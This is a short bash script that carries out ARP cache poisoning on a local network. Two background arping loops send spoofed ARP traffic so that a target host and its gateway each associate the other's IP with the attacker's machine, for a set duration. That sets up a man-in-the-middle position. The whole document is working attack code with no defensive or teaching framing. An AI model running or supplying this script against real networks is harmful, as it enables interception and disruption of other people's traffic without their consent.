#!/bin/bash
INTERFACE=${1:-eth0}
TARGET_IP=${2:-192.168.1.100}
GATEWAY_IP=${3:-192.168.1.1}
DURATION=${4:-60}

echo "[+] ARP Poisoning $TARGET_IP on $INTERFACE for $DURATION seconds"
sudo arping -I $INTERFACE -c 1000 -S $GATEWAY_IP $TARGET_IP &  # Poison target
sudo arping -I $INTERFACE -c 1000 -S $TARGET_IP $GATEWAY_IP &  # Poison gateway
sleep $DURATION
pkill arping
echo "[+] Poisoning stopped."
